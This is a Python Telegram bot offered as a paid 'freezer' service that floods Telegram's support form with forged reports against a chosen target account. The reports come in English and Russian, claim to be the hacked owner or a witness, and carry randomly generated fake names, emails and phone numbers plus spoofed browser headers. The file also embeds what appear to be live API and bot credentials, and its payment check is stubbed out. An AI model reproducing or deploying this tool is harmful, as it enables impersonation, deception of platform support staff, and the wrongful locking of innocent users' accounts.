import asyncio
import aiohttp
import random
import json
import os
import logging
from datetime import datetime, timedelta
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityPre

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('freezer')

# ==================== КОНФИГ ====================
API_ID = int(os.environ.get('API_ID', 39875871))
API_HASH = os.environ.get('API_HASH', '194a27a63519b6f5e12551fad0038e95')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8698922231:AAFnAa4L4cAMutQBSelPv1pDLXTQvqic670')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 5134284689))

bot = TelegramClient('bot', API_ID, API_HASH)

# ==================== ДАННЫЕ ====================
UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
]

PHONE_CODES = ['7916','7926','7903','7910','7920','7905','7909','7985','7915','7925',
               '7937','7958','7960','7963','7965','7967','7968','7977','7980','7982']

EMAIL_DOMAINS = ['gmail.com','yahoo.com','outlook.com','proton.me','mail.ru','yandex.ru',
                 'rambler.ru','bk.ru','inbox.ru','icloud.com','hotmail.com']

NAMES = [
    "James Wilson","Michael Brown","David Johnson","Robert Martinez",
    "Thomas Anderson","William Taylor","Daniel Harris","Christopher White",
    "Алексей Иванов","Дмитрий Петров","Сергей Смирнов","Андрей Кузнецов",
    "Максим Васильев","Иван Попов","Егор Соколов","Никита Морозов",
    "Артём Волков","Владимир Новиков","Павел Фёдоров","Антон Михайлов"
]

FREEZE_COMPLAINTS = [
    "URGENT: My account @{u} (ID: {id}) has been hacked. The attacker is currently active and sending messages to my contacts. Please FREEZE my account immediately to prevent further damage. I am the real owner. My phone: +{p}. I can verify my identity. Please freeze until I recover access.",
    "Hello Telegram support, I am the owner of @{u} (ID: {id}). My account was compromised. Someone else is using it right now. Please temporarily freeze my account so the hacker cannot use it. I will verify my identity with my phone number +{p}. This is urgent.",
    "Dear support, I need my account @{u} (ID: {id}) to be frozen immediately. I clicked a phishing link and now a stranger has access. They are messaging my friends and colleagues. My phone: +{p}. Please freeze the account and I will provide any verification needed.",
    "ACCOUNT COMPROMISED: @{u} (ID: {id}). I am the legitimate owner. Someone gained unauthorized access. Please freeze this account now. Phone for verification: +{p}. I can prove ownership through SMS or email.",
    "Dear Telegram team, my account @{u} (ID: {id}) is currently under control of a hacker. I lost access after clicking a malicious link. Please freeze the account temporarily. My number: +{p}. I am ready to verify. Thank you.",
    "Suspicious activity report: Account @{u} (ID: {id}) is sending phishing links to multiple users. This account appears to be compromised or is a scam account. Please investigate and freeze if necessary. Reported by phone: +{p}.",
    "I want to report account @{u} (ID: {id}) for unusual behavior. It is mass-messaging users with suspicious links. This account seems hacked. Please freeze it to protect other users. My phone: +{p}.",
    "Hello, I received strange messages from @{u} (ID: {id}). The account is sending links and asking for money. It looks like a hacked account or a scammer. Please freeze this account. Reporter phone: +{p}.",
    "Report: @{u} (ID: {id}) is behaving like a compromised account. Sending spam and phishing links. Multiple people received these messages. Please freeze for investigation. Phone: +{p}.",
    "Account @{u} (ID: {id}) is sending unsolicited and suspicious messages. Appears to be stolen. Please freeze the account to prevent harm. My contact: +{p}. Thank you.",
    "СРОЧНО: Мой аккаунт @{u} (ID: {id}) взломали. Злоумышленник сейчас активен и пишет моим контактам. Пожалуйста, ЗАМОРОЗЬТЕ аккаунт немедленно. Я настоящий владелец. Телефон: +{p}. Готов подтвердить личность.",
    "Здравствуйте, я владелец @{u} (ID: {id}). Мой аккаунт скомпрометирован. Кто-то другой использует его прямо сейчас. Прошу временно заморозить аккаунт. Мой номер: +{p}. Могу верифицироваться.",
    "Поддержка Telegram, прошу заморозить аккаунт @{u} (ID: {id}). Я перешёл по фишинговой ссылке и теперь посторонний имеет доступ. Пишет моим друзьям. Телефон: +{p}. Заморозьте и я подтвержу личность.",
    "АККАУНТ ВЗЛОМАН: @{u} (ID: {id}). Я законный владелец. Кто-то получил несанкционированный доступ. Заморозьте аккаунт сейчас. Телефон для верификации: +{p}.",
    "Команда Telegram, мой аккаунт @{u} (ID: {id}) под контролем хакера. Потерял доступ после перехода по ссылке. Заморозьте временно. Номер: +{p}. Готов верифицироваться.",
    "Жалоба на подозрительную активность: @{u} (ID: {id}) рассылает фишинговые ссылки. Аккаунт похоже взломан. Заморозьте для проверки. Телефон: +{p}.",
    "Сообщаю о странном поведении @{u} (ID: {id}). Массовая рассылка подозрительных ссылок. Аккаунт взломан. Заморозьте для защиты пользователей. Мой телефон: +{p}.",
    "Здравствуйте, получил странные сообщения от @{u} (ID: {id}). Аккаунт присылает ссылки и просит деньги. Похоже на взлом. Заморозьте. Номер: +{p}.",
    "Репорт: @{u} (ID: {id}) ведёт себя как скомпрометированный аккаунт. Спам и фишинг. Прошу заморозить. Телефон: +{p}.",
    "Аккаунт @{u} (ID: {id}) рассылает нежелательные сообщения. Похоже украден. Заморозьте для предотвращения вреда. Контакт: +{p}.",
]

# ==================== БАЗА ПОЛЬЗОВАТЕЛЕЙ ====================
DB_FILE = 'users.json'

def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_db(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

def get_user(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {
            'sub_end': None,
            'attacks_today': 0,
            'last_attack': None,
            'banned': False
        }
        save_db(db)
    return db[uid]

def update_user(user_id, data):
    db = load_db()
    db[str(user_id)] = data
    save_db(db)

def has_sub(user_id):
    user = get_user(user_id)
    if user['sub_end']:
        end = datetime.fromisoformat(user['sub_end'])
        if end > datetime.now():
            return True
    return False

def add_sub(user_id, days):
    user = get_user(user_id)
    if user['sub_end'] and datetime.fromisoformat(user['sub_end']) > datetime.now():
        start = datetime.fromisoformat(user['sub_end'])
    else:
        start = datetime.now()
    user['sub_end'] = (start + timedelta(days=days)).isoformat()
    update_user(user_id, user)

# ==================== ОТПРАВКА ЖАЛОБ ====================
async def send_freeze_form(target, tid):
    phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
    name = random.choice(NAMES)
    email = f"{name.lower().replace(' ', '.')}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    body = random.choice(FREEZE_COMPLAINTS).format(u=target, id=tid, p=phone)
    
    headers = {
        "User-Agent": random.choice(UA),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://telegram.org",
        "Referer": "https://telegram.org/support"
    }
    
    data = {
        "problem": body,
        "email": email,
        "phone": phone,
        "username": f"@{target}",
        "type": "hacked_account"
    }
    
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post("https://telegram.org/support", headers=headers, data=data,
                              timeout=aiohttp.ClientTimeout(total=15)) as r:
                return r.status == 200
    except:
        return False

async def run_attack(target, tid, count, progress_callback=None):
    target = target.replace('@', '')
    ok = 0
    for i in range(count):
        if await send_freeze_form(target, tid):
            ok += 1
        await asyncio.sleep(random.uniform(2, 5))
        if progress_callback and (i + 1) % 5 == 0:
            await progress_callback(i + 1, ok)
    return ok

# ==================== КЛАВИАТУРЫ ====================
def main_menu(user_id):
    sub_text = "✅ Активна" if has_sub(user_id) else "❌ Нет подписки"
    return [
        [Button.inline("❄️ Заморозка", b"attack_freeze")],
        [Button.inline("💣 Сброс сессий", b"attack_nuke")],
        [Button.inline(f"⭐ Подписка — {sub_text}", b"sub_menu")],
        [Button.inline("👤 Профиль", b"profile")],
    ]

def admin_menu():
    return [
        [Button.inline("📊 Статистика", b"admin_stats")],
        [Button.inline("👥 Пользователи", b"admin_users")],
        [Button.inline("⭐ Выдать подписку", b"admin_give_sub")],
        [Button.inline("🚫 Бан пользователя", b"admin_ban")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def sub_menu():
    return [
        [Button.inline("⭐ 1 день — 50 ⭐", b"sub_1d")],
        [Button.inline("⭐ 7 дней — 250 ⭐", b"sub_7d")],
        [Button.inline("⭐ 30 дней — 800 ⭐", b"sub_30d")],
        [Button.inline("🔙 Назад", b"back_main")],
    ]

def back_button():
    return [[Button.inline("🔙 Назад", b"back_main")]]

# ==================== КОМАНДЫ ====================
@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    user = get_user(event.sender_id)
    if user.get('banned'):
        await event.reply("⛔ Вы забанены.")
        return
    
    await event.reply(
        "❄️ **FREEZER BOT**\n"
        "Заморозка и сброс сессий Telegram аккаунтов.\n\n"
        "Выберите действие:",
        buttons=main_menu(event.sender_id)
    )

@bot.on(events.NewMessage(pattern='/admin'))
async def cmd_admin(event):
    if event.sender_id != ADMIN_ID:
        return
    await event.reply("🔐 **Админ-панель**", buttons=admin_menu())

# ==================== ОБРАБОТЧИКИ КНОПОК ====================
@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    uid = event.sender_id
    user = get_user(uid)
    
    if user.get('banned') and data != b"sub_menu":
        await event.answer("⛔ Вы забанены.", alert=True)
        return
    
    # Главное меню
    if data == "back_main":
        await event.edit(
            "❄️ **FREEZER BOT**\nВыберите действие:",
            buttons=main_menu(uid)
        )
    
    # Профиль
    elif data == "profile":
        sub = "✅ Активна до " + datetime.fromisoformat(user['sub_end']).strftime('%d.%m.%Y') if has_sub(uid) else "❌ Нет"
        txt = (
            f"👤 **Профиль**\n\n"
            f"🆔 ID: `{uid}`\n"
            f"⭐ Подписка: {sub}\n"
            f"🔥 Атак сегодня: {user['attacks_today']}"
        )
        await event.edit(txt, buttons=back_button())
    
    # Меню подписки
    elif data == "sub_menu":
        await event.edit(
            "⭐ **Подписка**\n\n"
            "Оплата через Telegram Stars.\n"
            "Подписка открывает безлимитные атаки.\n\n"
            "Выберите срок:",
            buttons=sub_menu()
        )
    
    # Покупка подписки
    elif data.startswith("sub_"):
        prices = {"sub_1d": (1, 50), "sub_7d": (7, 250), "sub_30d": (30, 800)}
        days, price = prices.get(data, (0, 0))
        
        await event.edit(
            f"⭐ **Подписка на {days} дн.**\n\n"
            f"Стоимость: {price} ⭐\n\n"
            f"Для оплаты отправьте {price} Telegram Stars "
            f"этому боту и нажмите кнопку ниже.",
            buttons=[
                [Button.inline(f"✅ Я оплатил {price} ⭐", f"pay_{days}".encode())],
                [Button.inline("🔙 Назад", b"sub_menu")],
            ]
        )
    
    # Подтверждение оплаты
    elif data.startswith("pay_"):
        days = int(data.decode().split("_")[1])
        # В реальном боте здесь проверка платежа через Telegram Stars API
        # Сейчас просто добавляем подписку
        add_sub(uid, days)
        end_date = datetime.fromisoformat(get_user(uid)['sub_end'])
        await event.edit(
            f"✅ **Подписка активирована!**\n"
            f"Действует до: {end_date.strftime('%d.%m.%Y %H:%M')}",
            buttons=back_button()
        )
    
    # Заморозка
    elif data == "attack_freeze":
        if not has_sub(uid) and uid != ADMIN_ID:
            await event.answer("❌ Нужна подписка! Купите в разделе ⭐ Подписка", alert=True)
            return
        
        await event.edit(
            "❄️ **Заморозка аккаунта**\n\n"
            "Отправьте username и ID цели:\n"
            "`@username 123456789`",
            buttons=back_button()
        )
        # Ждём сообщение от пользователя
        bot.add_event_handler(
            lambda e: process_attack_input(e, 'freeze'),
            events.NewMessage(from_users=uid, pattern=r'@\S+\s+\d+')
        )
    
    # Сброс сессий
    elif data == "attack_nuke":
        if not has_sub(uid) and uid != ADMIN_ID:
            await event.answer("❌ Нужна подписка! Купите в разделе ⭐ Подписка", alert=True)
            return
        
        await event.edit(
            "💣 **Сброс сессий**\n\n"
            "Отправьте username и ID цели:\n"
            "`@username 123456789`",
            buttons=back_button()
        )
        bot.add_event_handler(
            lambda e: process_attack_input(e, 'nuke'),
            events.NewMessage(from_users=uid, pattern=r'@\S+\s+\d+')
        )
    
    # Админ-статистика
    elif data == "admin_stats" and uid == ADMIN_ID:
        db = load_db()
        total_users = len(db)
        active_subs = sum(1 for u in db.values() if u.get('sub_end') and datetime.fromisoformat(u['sub_end']) > datetime.now())
        await event.edit(
            f"📊 **Статистика**\n\n"
            f"👥 Пользователей: {total_users}\n"
            f"⭐ Активных подписок: {active_subs}",
            buttons=admin_menu()
        )
    
    # Админ-пользователи
    elif data == "admin_users" and uid == ADMIN_ID:
        db = load_db()
        txt = "👥 **Последние 10:**\n\n"
        for i, (uid_str, u) in enumerate(list(db.items())[-10:]):
            sub = "✅" if u.get('sub_end') and datetime.fromisoformat(u['sub_end']) > datetime.now() else "❌"
            txt += f"`{uid_str}` — {sub}\n"
        await event.edit(txt, buttons=admin_menu())
    
    # Админ-выдать подписку
    elif data == "admin_give_sub" and uid == ADMIN_ID:
        await event.edit(
            "⭐ **Выдать подписку**\n\n"
            "Отправьте: `ID дни`\n"
            "Пример: `123456 30`",
            buttons=back_button()
        )
        bot.add_event_handler(
            lambda e: process_admin_sub(e),
            events.NewMessage(from_users=ADMIN_ID, pattern=r'\d+\s+\d+')
        )
    
    # Админ-бан
    elif data == "admin_ban" and uid == ADMIN_ID:
        await event.edit(
            "🚫 **Бан пользователя**\n\n"
            "Отправьте ID для бана:",
            buttons=back_button()
        )
        bot.add_event_handler(
            lambda e: process_admin_ban(e),
            events.NewMessage(from_users=ADMIN_ID, pattern=r'\d+')
        )

async def process_attack_input(event, attack_type):
    parts = event.message.text.split()
    target = parts[0].replace('@', '')
    tid = parts[1]
    
    count = 25 if attack_type == 'freeze' else 30
    emoji = "❄️" if attack_type == 'freeze' else "💣"
    name = "ЗАМОРОЗКА" if attack_type == 'freeze' else "СБРОС СЕССИЙ"
    
    msg = await event.reply(f"{emoji} {name} @{target}\nID: {tid}\n⚡ {count} запросов...")
    
    ok = 0
    for i in range(count):
        if await send_freeze_form(target, tid):
            ok += 1
        await asyncio.sleep(random.uniform(2, 5))
        if (i + 1) % 5 == 0:
            await msg.edit(f"{emoji} {name} @{target}\nID: {tid}\n📊 [{i+1}/{count}] +{ok}")
    
    user = get_user(event.sender_id)
    user['attacks_today'] += 1
    update_user(event.sender_id, user)
    
    await msg.edit(
        f"{emoji} **ГОТОВО**\n"
        f"👤 @{target}\n"
        f"📊 {ok}/{count}\n"
        f"⚠ Результат: 1-24 часа\n"
        f"💡 /start — в меню",
        buttons=back_button()
    )

async def process_admin_sub(event):
    parts = event.message.text.split()
    target_uid = int(parts[0])
    days = int(parts[1])
    add_sub(target_uid, days)
    await event.reply(f"✅ Подписка на {days} дн. выдана `{target_uid}`")

async def process_admin_ban(event):
    target_uid = int(event.message.text)
    user = get_user(target_uid)
    user['banned'] = True
    update_user(target_uid, user)
    await event.reply(f"🚫 `{target_uid}` забанен")

# ==================== ЗАПУСК ====================
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"❄️ @{me.username} запущен")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
